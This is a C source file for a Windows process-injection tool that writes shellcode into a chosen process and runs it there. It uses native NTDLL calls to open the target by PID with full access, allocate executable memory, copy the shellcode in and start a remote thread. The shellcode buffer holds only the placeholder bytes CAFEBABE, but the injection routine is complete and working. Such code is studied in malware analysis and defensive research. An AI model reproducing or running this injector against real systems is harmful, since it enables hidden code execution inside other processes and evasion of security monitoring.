#include "ntapi.h"

HMODULE GetModule(IN LPCWSTR moduleName)
{
    HMODULE hModule = NULL;
    hModule = GetModuleHandleW(moduleName);
    if (hModule == NULL)
    {
        warn("Error: failed to get handle to module, 0x%lx\n", GetLastError());
        return NULL;
    }
    else 
    {
        //okay("Got handle 0x%p to module %S", hModule, moduleName);
        okay("Got handle to module");
        info("[ %S ] --> [ 0x%p ]\n", moduleName, hModule);
        return hModule;
    }
}

int main(int argc, char* argv[])
{
    DWORD PID = NULL;
    HMODULE hNTDLL = NULL;
    PVOID bAddress = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    NTSTATUS STATUS;

    
    /* const keyword makes it so sc is placed in .rodata, unsigned char is mutable and in .data */
    unsigned char sc[] = "\xCA\xFE\xBA\xBE";

    SIZE_T scSize = sizeof(sc);
    SIZE_T bytesWritten = 0;
    
    if (argc < 2)
    {
        info("Usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    hNTDLL = GetModule(L"NTDLL");

    /*init struct for ntOpenProcess*/
    OBJECT_ATTRIBUTES oa = {sizeof(oa), NULL };
    CLIENT_ID cid = { (HANDLE)PID, NULL };

    info("Populating prototypes...");
    NtOpenProcess open = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemory alloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory write = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    
    okay("Attempting injection...");
    STATUS = open(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtOpenProcess returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Got handle for process");
    info("[ %ld ] --> [ 0x%p ]", PID, hProcess);

    STATUS = alloc(hProcess, &bAddress, NULL, &scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtAllocateVirtualMemory returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Allocated %ld bytes in process 0x%p", scSize, hProcess);
    
    STATUS = write(hProcess, bAddress, sc, sizeof(sc), &bytesWritten); //dont use scSize
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtWriteVirtualMemory returned NTSTATUS 0x%lx. %ld bytes had been written", STATUS, bytesWritten);
        return EXIT_FAILURE;
    }
    okay("Wrote %ld bytes into process 0x%p", scSize, hProcess);
    okay("Executing thread...");

    STATUS = thread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, bAddress, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtCreateThreadEx returned NTSTATUS 0x%lx", STATUS);
    }
    okay("Thread created. Waiting for thread to finish...");

    WaitForSingleObject(hThread, INFINITE);
    okay("Thread finished! Cleaning up...");

    if(hThread) STATUS = close(hThread);
    if(hProcess) STATUS = close(hProcess);

    okay("Done!");
    return EXIT_SUCCESS;
}
